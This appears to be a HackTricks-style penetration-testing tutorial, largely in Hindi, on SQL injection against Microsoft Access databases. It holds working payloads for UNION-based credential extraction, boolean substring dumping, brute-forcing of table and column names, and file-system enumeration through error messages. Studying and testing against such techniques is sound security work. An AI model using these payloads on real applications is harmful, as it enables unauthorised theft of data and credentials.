# MS Access SQL Injection

{{#include ../../banners/hacktricks-training.md}}

## Online Playground

- [https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format\&ss=-1](https://www.w3schools.com/sql/trysql.asp?filename=trysql_func_ms_format&ss=-1)

## DB Limitations

### String Concatenation

स्ट्रिंग संयोजन `& (%26)` और `+ (%2b)` अक्षरों के साथ संभव है।
```sql
1' UNION SELECT 'web' %2b 'app' FROM table%00
1' UNION SELECT 'web' %26 'app' FROM table%00
```
### टिप्पणियाँ

MS Access में कोई टिप्पणियाँ नहीं हैं, लेकिन स्पष्ट रूप से एक NULL चर के साथ एक क्वेरी के अंतिम को हटाना संभव है:
```sql
1' union select 1,2 from table%00
```
यदि यह काम नहीं कर रहा है, तो आप हमेशा क्वेरी की सिंटैक्स को ठीक कर सकते हैं:
```sql
1' UNION SELECT 1,2 FROM table WHERE ''='
```
### Stacked Queries

वे समर्थित नहीं हैं।

### LIMIT

**`LIMIT`** ऑपरेटर **कार्यान्वित नहीं किया गया है**। हालाँकि, SELECT क्वेरी परिणामों को **पहले N तालिका पंक्तियों तक सीमित करना संभव है `TOP` ऑपरेटर का उपयोग करके**। `TOP` एक पूर्णांक को तर्क के रूप में स्वीकार करता है, जो लौटाई जाने वाली पंक्तियों की संख्या का प्रतिनिधित्व करता है।
```sql
1' UNION SELECT TOP 3 attr FROM table%00
```
जैसे TOP, आप **`LAST`** का उपयोग कर सकते हैं जो **अंत से पंक्तियाँ प्राप्त करेगा**।

## UNION Queries/Sub queries

SQLi में, आप आमतौर पर किसी न किसी तरह से एक नई क्वेरी निष्पादित करना चाहेंगे ताकि अन्य तालिकाओं से जानकारी निकाली जा सके। MS Access हमेशा आवश्यक है कि **उपक्वेरियों या अतिरिक्त क्वेरियों में `FROM` को इंगित किया जाए**।\
तो, यदि आप `UNION SELECT` या `UNION ALL SELECT` या एक शर्त में कोष्ठक के बीच `SELECT` निष्पादित करना चाहते हैं, तो आपको हमेशा **एक मान्य तालिका नाम के साथ `FROM` को इंगित करने की आवश्यकता है**।\
इसलिए, आपको एक **मान्य तालिका नाम** जानने की आवश्यकता है।
```sql
-1' UNION SELECT username,password from users%00
```
### Chaining equals + Substring

> [!WARNING]
> यह आपको वर्तमान तालिका के मानों को निकालने की अनुमति देगा बिना तालिका के नाम को जाने।

**MS Access** अजीब **सिंटैक्स** की अनुमति देता है जैसे **`'1'=2='3'='asd'=false`**। जैसा कि आमतौर पर SQL injection एक **`WHERE`** क्लॉज के अंदर होगा, हम इसका दुरुपयोग कर सकते हैं।

कल्पना करें कि आपके पास एक MS Access डेटाबेस में SQLi है और आप जानते हैं (या अनुमान लगाते हैं) कि एक **कॉलम का नाम username** है, और यही वह फ़ील्ड है जिसे आप **exfiltrate** करना चाहते हैं। आप वेब ऐप के विभिन्न प्रतिक्रियाओं की जांच कर सकते हैं जब चेनिंग इक्वल्स तकनीक का उपयोग किया जाता है और संभावित रूप से **`Mid`** फ़ंक्शन का उपयोग करके सबस्ट्रिंग प्राप्त करने के लिए **boolean injection** के साथ सामग्री निकाल सकते हैं।
```sql
'=(Mid(username,1,3)='adm')='
```
यदि आप **टेबल का नाम** और **कॉलम** जानते हैं जिसे डंप करना है, तो आप `Mid`, `LAST` और `TOP` के बीच एक संयोजन का उपयोग कर सकते हैं ताकि **सभी जानकारी लीक** की जा सके बूलियन SQLi के माध्यम से:
```sql
'=(Mid((select last(useranme) from (select top 1 username from usernames)),1,3)='Alf')='
```
_इसका ऑनलाइन प्लेग्राउंड में जांचने के लिए स्वतंत्र महसूस करें।_

### टेबल नामों का ब्रूट-फोर्सिंग

चेनिंग इक्वल्स तकनीक का उपयोग करके आप कुछ इस तरह से **टेबल नामों का ब्रूट-फोर्स** भी कर सकते हैं:
```sql
'=(select+top+1+'lala'+from+<table_name>)='
```
आप एक अधिक पारंपरिक तरीके का भी उपयोग कर सकते हैं:
```sql
-1' AND (SELECT TOP 1 <table_name>)%00
```
_इसे ऑनलाइन प्लेग्राउंड में चेक करने के लिए स्वतंत्र महसूस करें।_

- Sqlmap सामान्य तालिका नाम: [https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt](https://github.com/sqlmapproject/sqlmap/blob/master/data/txt/common-tables.txt)
- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html) में एक और सूची है

### ब्रूट-फोर्सिंग कॉलम नाम

आप **चेनिंग इक्वल्स ट्रिक** के साथ वर्तमान कॉलम नामों को **ब्रूट-फोर्स** कर सकते हैं:
```sql
'=column_name='
```
या **group by** के साथ:
```sql
-1' GROUP BY column_name%00
```
या आप **अलग तालिका** के कॉलम नामों को ब्रूट-फोर्स कर सकते हैं:
```sql
'=(SELECT TOP 1 column_name FROM valid_table_name)='

-1' AND (SELECT TOP 1 column_name FROM valid_table_name)%00
```
### डेटा डंप करना

हमने पहले ही [**चेनिंग इक्वल्स तकनीक**](ms-access-sql-injection.md#chaining-equals-+-substring) **से वर्तमान और अन्य तालिकाओं से डेटा डंप करने** पर चर्चा की है। लेकिन अन्य तरीके भी हैं:
```sql
IIF((select mid(last(username),1,1) from (select top 10 username from users))='a',0,'ko')
```
संक्षेप में, क्वेरी एक "if-then" कथन का उपयोग करती है ताकि सफलता की स्थिति में "200 OK" या अन्यथा "500 Internal Error" को ट्रिगर किया जा सके। TOP 10 ऑपरेटर का लाभ उठाते हुए, पहले दस परिणामों का चयन करना संभव है। LAST का बाद में उपयोग केवल 10वें ट्यूपल पर विचार करने की अनुमति देता है। ऐसे मान पर, MID ऑपरेटर का उपयोग करके, एक सरल वर्ण तुलना करना संभव है। MID और TOP के इंडेक्स को सही ढंग से बदलकर, हम सभी पंक्तियों के "username" फ़ील्ड की सामग्री को डंप कर सकते हैं।

### Time Based

Check [https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN](<https://docs.microsoft.com/en-us/previous-versions/tn-archive/cc512676(v=technet.10)?redirectedfrom=MSDN>)

### Other Interesting functions

- `Mid('admin',1,1)` स्थिति 1 से लंबाई 1 का उपस्ट्रिंग प्राप्त करें (प्रारंभिक स्थिति 1 है)
- `LEN('1234')` स्ट्रिंग की लंबाई प्राप्त करें
- `ASC('A')` वर्ण का ASCII मान प्राप्त करें
- `CHR(65)` ASCII मान से स्ट्रिंग प्राप्त करें
- `IIF(1=1,'a','b')` यदि तब
- `COUNT(*)` आइटम की संख्या गिनें

## Enumerating tables

From [**here**](https://dataedo.com/kb/query/access/list-of-tables-in-the-database) you can see a query to get tables names:
```sql
select MSysObjects.name
from MSysObjects
where
MSysObjects.type In (1,4,6)
and MSysObjects.name not like '~*'
and MSysObjects.name not like 'MSys*'
order by MSysObjects.name
```
हालांकि, ध्यान दें कि SQL इनजेक्शन पाना बहुत सामान्य है जहाँ आपके पास **`MSysObjects`** तालिका को पढ़ने का एक्सेस नहीं है।

## फ़ाइल सिस्टम एक्सेस

### वेब रूट डायरेक्टरी का पूर्ण पथ

**वेब रूट का पूर्ण पथ जानने से आगे के हमलों में मदद मिल सकती है**। यदि एप्लिकेशन की त्रुटियाँ पूरी तरह से छिपी नहीं हैं, तो एक गैर-मौजूद डेटाबेस से डेटा चुनने की कोशिश करते समय डायरेक्टरी पथ का पता लगाया जा सकता है।

`http://localhost/script.asp?id=1'+'+UNION+SELECT+1+FROM+FakeDB.FakeTable%00`

MS Access एक **त्रुटि संदेश के साथ प्रतिक्रिया करता है जिसमें वेब डायरेक्टरी का पूर्ण पथ होता है**।

### फ़ाइल एन्यूमरेशन

निम्नलिखित हमलावर वेक्टर का उपयोग **दूरस्थ फ़ाइल सिस्टम पर एक फ़ाइल के अस्तित्व का अनुमान लगाने के लिए किया जा सकता है**। यदि निर्दिष्ट फ़ाइल मौजूद है, तो MS Access एक त्रुटि संदेश उत्पन्न करता है जो सूचित करता है कि डेटाबेस प्रारूप अमान्य है:

`http://localhost/script.asp?id=1'+UNION+SELECT+name+FROM+msysobjects+IN+'\boot.ini'%00`

फ़ाइलों को एन्यूमरेट करने का एक और तरीका **एक डेटाबेस.तालिका आइटम को निर्दिष्ट करना** है। **यदि** निर्दिष्ट **फ़ाइल मौजूद है**, तो MS Access एक **डेटाबेस प्रारूप त्रुटि संदेश** प्रदर्शित करता है।

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+C:\boot.ini.TableName%00`

### .mdb फ़ाइल नाम अनुमान लगाना

**डेटाबेस फ़ाइल नाम (.mdb)** को निम्नलिखित क्वेरी के साथ अनुमान लगाया जा सकता है:

`http://localhost/script.asp?id=1'+UNION+SELECT+1+FROM+name[i].realTable%00`

जहाँ **name\[i] एक .mdb फ़ाइल नाम** है और **realTable डेटाबेस के भीतर एक मौजूदा तालिका है**। हालांकि MS Access हमेशा एक त्रुटि संदेश उत्पन्न करेगा, लेकिन अमान्य फ़ाइल नाम और मान्य .mdb फ़ाइल नाम के बीच अंतर करना संभव है।

### .mdb पासवर्ड क्रैकर

[**Access PassView**](https://www.nirsoft.net/utils/accesspv.html) एक मुफ्त उपयोगिता है जिसका उपयोग Microsoft Access 95/97/2000/XP या Jet Database Engine 3.0/4.0 के मुख्य डेटाबेस पासवर्ड को पुनर्प्राप्त करने के लिए किया जा सकता है।

## संदर्भ

- [http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html](http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)

{{#include ../../banners/hacktricks-training.md}}
